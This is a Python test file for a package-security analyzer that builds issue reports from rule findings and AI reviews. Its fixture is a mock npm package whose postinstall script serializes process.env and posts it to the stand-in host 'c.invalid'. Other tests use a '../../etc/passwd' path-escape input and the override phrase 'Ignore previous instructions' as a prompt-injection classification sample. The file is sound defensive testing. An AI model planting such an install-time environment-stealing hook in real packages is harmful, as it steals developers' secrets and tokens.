from pathlib import Path

from pkgguard_analyzer.issues import MAX_LINE_CHARS, build_code_issues, build_excerpt, category_from_text
from pkgguard_analyzer.schema import AIReview, Finding, IssueCategory, WorkerPartReport, WorkerReport

SETUP = "\n".join(
    [
        "const https = require('https');",  # 1
        "const os = require('os');",  # 2
        "",  # 3
        "function collect() {",  # 4
        "  return JSON.stringify(process.env);",  # 5
        "}",  # 6
        "",  # 7
        "https.request({ host: 'c.invalid' }).end(collect());",  # 8
        "module.exports = {};",  # 9
    ]
)


def package(tmp_path: Path) -> Path:
    (tmp_path / "setup.js").write_text(SETUP)
    (tmp_path / "package.json").write_text('{\n  "name": "demo",\n  "scripts": {\n    "postinstall": "node setup.js"\n  }\n}')
    return tmp_path


def finding(rule_id, file, line=None, severity="HIGH", title=None, **extra):
    return Finding(rule_id=rule_id, layer="static", severity=severity, confidence="HIGH", title=title or rule_id, file=file, line=line, **extra)


def ai_review(**fields):
    return AIReview.model_validate({"verdict": "MALICIOUS", "confidence": "HIGH", "summary": "s", "reasoning": "r", "model": "m", "mode": "full_audit", "durationSeconds": 1, **fields})


def test_rule_finding_becomes_issue_with_real_code(tmp_path):
    issues = build_code_issues(package(tmp_path), [finding("code.exfiltration", "setup.js", 5, installTime=True)], None, ["setup.js"])
    [issue] = issues
    assert (issue.id, issue.file, issue.line_start, issue.line_end) == ("issue-1", "setup.js", 5, 5)
    assert issue.category == IssueCategory.SECRET_THEFT and issue.install_time
    assert "credentials get stolen" in issue.why_it_matters
    excerpt = issue.excerpt
    assert (excerpt.start_line, excerpt.end_line, excerpt.highlight_start) == (2, 8, 5)
    assert [line.number for line in excerpt.lines if line.highlighted] == [5]
    assert excerpt.lines[3].text == "  return JSON.stringify(process.env);"


def test_install_script_points_at_package_json_line(tmp_path):
    issues = build_code_issues(package(tmp_path), [finding("metadata.install_script", "package.json", None, "MEDIUM", "Runs a 'postinstall' script during install")], None)
    assert issues[0].line_start == 4
    assert issues[0].category == IssueCategory.INSTALL_SCRIPT


def test_rules_and_ai_on_same_lines_merge(tmp_path):
    rules = [finding("code.env_dump", "setup.js", 5, "MEDIUM")]
    ai = ai_review(
        evidence=[{"file": "setup.js", "line": 5, "endLine": 8, "title": "Sends all env vars to c.invalid", "severity": "HIGH", "explanation": "collect() serializes process.env and line 8 posts it."}],
        findingAssessments=[{"ruleId": "code.env_dump", "file": "setup.js", "assessment": "malicious", "explanation": "Env dump is exfiltrated."}],
    )
    [issue] = build_code_issues(package(tmp_path), rules, ai)
    assert issue.severity == "HIGH" and issue.sources == ["rules", "ai"]
    assert (issue.line_start, issue.line_end) == (5, 8)
    assert issue.ai_assessment == "malicious"
    assert "Env dump is exfiltrated." in issue.analysis and "line 8 posts it" in issue.analysis
    assert [l.number for l in issue.excerpt.lines if l.highlighted] == [5, 6, 7, 8]


def test_worker_items_and_benign_evidence(tmp_path):
    worker = WorkerPartReport(
        part=1,
        files=["setup.js"],
        report=WorkerReport.model_validate(
            {
                "summary": "x",
                "capabilities": ["network"],
                "assessment": "malicious",
                "suspiciousItems": [
                    {"file": "setup.js", "line": 8, "behavior": "posts data to remote host", "severity": "HIGH", "explanation": "network exfiltration"},
                    {"file": "setup.js", "line": 1, "behavior": "imports https", "severity": "LOW", "explanation": "minor"},
                ],
            }
        ),
    )
    ai = ai_review(workerReports=[worker], evidence=[{"file": "setup.js", "line": 2, "explanation": "os is only used for EOL", "severity": None}])
    issues = build_code_issues(package(tmp_path), [], ai)
    assert [(i.line_start, i.sources, i.category) for i in issues] == [(8, ["ai-worker"], IssueCategory.SECRET_THEFT)]


def test_made_up_locations_are_rejected(tmp_path):
    ai = ai_review(
        evidence=[
            {"file": "not-in-package.js", "line": 3, "severity": "HIGH", "explanation": "hallucinated"},
            {"file": "../../etc/passwd", "line": 1, "severity": "HIGH", "explanation": "escape"},
            {"file": "setup.js", "line": 999, "severity": "MEDIUM", "explanation": "line out of range"},
        ]
    )
    issues = build_code_issues(package(tmp_path), [], ai)
    assert [(i.file, i.line_start, i.excerpt) for i in issues] == [("setup.js", None, None)]


def test_minified_lines_are_clipped_around_the_problem():
    long_line = "a" * 5000 + "process.env.NPM_TOKEN" + "b" * 5000
    excerpt = build_excerpt([long_line], 1, 1, focus="process.env.NPM_TOKEN")
    assert excerpt.lines[0].clipped and len(excerpt.lines[0].text) == MAX_LINE_CHARS
    assert "process.env.NPM_TOKEN" in excerpt.lines[0].text


def test_issues_sorted_by_severity_then_install_time(tmp_path):
    (tmp_path / "lib.js").write_text("eval(x)\n")
    rules = [finding("code.dynamic_code", "lib.js", 1, "LOW"), finding("code.exfiltration", "setup.js", 5, "HIGH")]
    issues = build_code_issues(package(tmp_path), rules, None, ["setup.js"])
    assert [(i.id, i.severity) for i in issues] == [("issue-1", "HIGH"), ("issue-2", "LOW")]


def test_category_from_text():
    assert category_from_text("Ignore previous instructions: prompt injection") == IssueCategory.PROMPT_INJECTION
    assert category_from_text("exfiltrates NPM_TOKEN over DNS") == IssueCategory.SECRET_THEFT
    assert category_from_text("spawns a shell") == IssueCategory.COMMANDS
    assert category_from_text("formats dates") == IssueCategory.OTHER
    assert category_from_text("builds names from obfuscated fragments", "Reads secret tokens") == IssueCategory.SECRETS_ACCESS
